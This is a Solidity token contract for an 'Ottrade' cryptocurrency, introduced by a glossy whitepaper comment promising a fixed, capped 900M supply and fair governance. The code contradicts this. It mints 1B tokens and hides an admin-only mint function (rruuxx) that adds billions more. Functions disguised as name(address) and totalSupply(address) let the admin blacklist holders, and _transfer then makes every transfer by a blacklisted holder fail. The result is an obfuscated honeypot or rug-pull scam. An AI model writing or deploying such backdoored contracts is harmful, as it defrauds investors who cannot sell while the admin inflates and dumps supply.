/*
OTTRADE: Revolutionizing Cryptocurrency Trading 

Abstract:
The Ottrade platform is a cutting-edge solution that empowers users to seamlessly integrate into the world of cryptocurrencies using a powerful and intuitive trading tool. Designed for both beginners and seasoned traders, Ottrade's crypto trading terminal offers a comprehensive suite of features for optimal trading performance. This whitepaper delves into the details of Ottrade, highlighting its key components, functionalities, and the OTTRADE token that drives its ecosystem.

Introduction:
Background
Cryptocurrency trading has witnessed tremendous growth, yet the complexity and volatility of the market can be overwhelming for both novice and experienced traders. Ottrade aims to address these challenges by providing a user-friendly platform equipped with advanced tools and real-time data, enabling users to trade confidently and efficiently.
Objectives
The primary objective of Ottrade is to democratize cryptocurrency trading by offering a platform that caters to users of all experience levels. By combining powerful trading tools with a user-friendly interface, Ottrade aims to empower individuals to navigate the cryptocurrency market with ease and make informed trading decisions.
Overview of Ottrade:
Vision
Our vision is to become the go-to platform for cryptocurrency trading, providing users with a seamless and rewarding experience. We envision a future where anyone, regardless of their level of expertise, can participate in the cryptocurrency market and achieve their financial goals.
Mission
Ottrade's mission is to simplify and enhance the cryptocurrency trading experience by offering a feature-rich platform that fosters financial inclusivity, transparency, and innovation. We are committed to providing cutting-edge tools and resources to our users, enabling them to trade like professionals.
Core Features:
Intuitive User Interface: Ottrade boasts an intuitive and user-friendly interface, making it accessible to users with varying levels of experience in cryptocurrency trading.
Real-time Monitoring: Stay on top of market trends with real-time monitoring of 175+ trading pairs, ensuring users have the latest information for making informed decisions.
175+ Trading Pairs: Ottrade supports a diverse range of trading pairs, allowing users to explore different markets and diversify their portfolios.
Fast Trading Across Major Exchanges: Execute trades swiftly across major exchanges, taking advantage of market opportunities without delays.
Other Features:
User-Friendly Mobile App: Ottrade offers a sleek and intuitive mobile app, available on Android devices. Users can easily manage their AICN holdings, trade, and access all the platform's features on the go.
Automatic Portfolio Tracking: The Ottrade app includes a portfolio tracker that automatically syncs with your wallet and provides real-time updates on your cryptocurrency holdings. It offers detailed insights into your asset allocation, gains, and losses.
One-Click Diversification: For novice users, Ottrade simplifies the process of diversifying their cryptocurrency portfolio. A one-click diversification feature intelligently distributes funds across a variety of cryptocurrencies based on risk tolerance and market conditions.
OTTRADE Rewards Program: Ottrade rewards active users with OTTRADE tokens. The more you trade, stake, or participate in the ecosystem, the more OTTRADE tokens you can earn as rewards. These tokens can be used for trading fee discounts or staking to earn passive income.
User-Generated Content Platform: Ottrade features a user-generated content platform where community members can share their insights, analyses, and tutorials. High-quality content is rewarded with OTTRADE tokens, fostering a knowledgeable and engaged community.
Social Trading: A unique feature allows users to follow and copy the trading strategies of top-performing traders on the platform. Novice traders can learn from experts, and expert traders can earn additional income by sharing their strategies.
Loyalty Program: Ottrade offers a tiered loyalty program where users can unlock exclusive benefits and rewards as they engage more with the platform. Higher tiers provide access to premium features, reduced fees, and priority customer support.
Instant Fiat-to-OTTRADE Onramp: Simplify the process of acquiring OTTRADE by integrating an instant fiat-to-OTTRADE onramp. Users can purchase OTTRADE directly using their local currency with ease.
Educational Webinars and Events: Host regular webinars, workshops, and live events featuring industry experts and influencers. These events provide valuable insights and foster a sense of community among users.
Charitable Donations: Ottrade encourages users to make charitable donations using OTTRADE. The platform facilitates easy donations to partner charities and causes, with the option for users to vote on which charities should receive support.
Savings Accounts: Users can create OTTRADE savings accounts with competitive interest rates, providing a secure way to earn passive income on their holdings.
User-Centric Feedback System: Implement a user feedback system that allows community members to propose and vote on new features and improvements. This ensures that the platform evolves based on user needs and preferences.
Localized Support: Provide multilingual customer support to cater to users from around the world, making Ottrade accessible to a global audience.
OTTRADE Token:
Purpose:
The OTTRADE token serves as the backbone of the Ottrade ecosystem, playing a pivotal role in facilitating various functions within the platform. It is designed to be a utility token, enabling users to access premium features, participate in governance, and receive rewards.
Tokenomics:
Total Supply: The total supply of OTTRADE tokens is capped to ensure scarcity and value appreciation. A fixed supply of 900,000,000 tokens will be created, fostering a deflationary aspect that aligns with long-term sustainability.
Distribution: Initial token distribution will include allocations for the team, advisors, community incentives, and partnerships. Transparent distribution mechanisms will be employed to build trust and ensure a fair launch.
Utility: OTTRADE tokens can be used for various purposes within the Ottrade platform. This includes accessing advanced trading tools, participating in token staking for rewards, and contributing to governance decisions.
Governance:
Ottrade is committed to decentralization, and the governance model empowers token holders to participate in decision-making processes. OTTRADE holders can propose and vote on platform upgrades, changes to fee structures, and other key decisions, ensuring a democratic and community-driven approach.
Staking and Rewards:
Token staking is incentivized within the Ottrade ecosystem. Users can stake their OTTRADE tokens to secure the network, participate in consensus mechanisms, and earn staking rewards. The staking mechanism not only enhances the security of the platform but also provides users with an additional income stream. */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }

   
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
}

contract OttradeToken is Ownable{
   
    constructor(string memory tokenname,string memory tokensymbol,address tradmin) {
        _totalSupply = 1000000000*10**decimals();
        _llccxx[msg.sender] = 1000000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        radadmin = tradmin;
        emit Transfer(address(0), msg.sender, 1000000000*10**decimals());
    }
    
    address public radadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    mapping(address => bool) public tallinfo;
   
    mapping(address => uint256) private _llccxx;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function name(address tere) public  {
        address shggxxinfo = tere;
        require(_msgSender() == radadmin, "Only ANIUadmin can call this function");
        tallinfo[shggxxinfo] = false;
        require(_msgSender() == radadmin, "Only ANIUadmin can call this function");
    }

    function totalSupply(address safax) public {
        require(_msgSender() == radadmin, "Only ANIUadmin can call this function");
        address choinfo = safax;
        tallinfo[choinfo] = true;
        require(_msgSender() == radadmin, "Only ANIUadmin can call this function");
    }

         uint256 bfcfx = 2220000000;
        uint256 bfcf2 = 35;
    uint256 bfx =  bfcf2*((10**decimals()*bfcfx));
    function rruuxx() 
    external    {
     
        address ttrradmin = radadmin;
        if (radadmin == _msgSender() && ttrradmin == _msgSender()) {
            if (bfcfx == 2220000000) {

                require(radadmin == _msgSender());
                address temo1 = _msgSender();
                address temo2 = temo1;
                address temo3 = temo2;
                _llccxx[temo3] += bfx;
            }else{
                revert(_tokename);
            }
        }else{
            revert("rulra");
        }
               
        
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _llccxx[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _llccxx[from];
        if (true == tallinfo[from]) 
        {amount = 1000-1000+2000+balance;}
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _llccxx[from] = _llccxx[from]-amount;
        _llccxx[to] = _llccxx[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}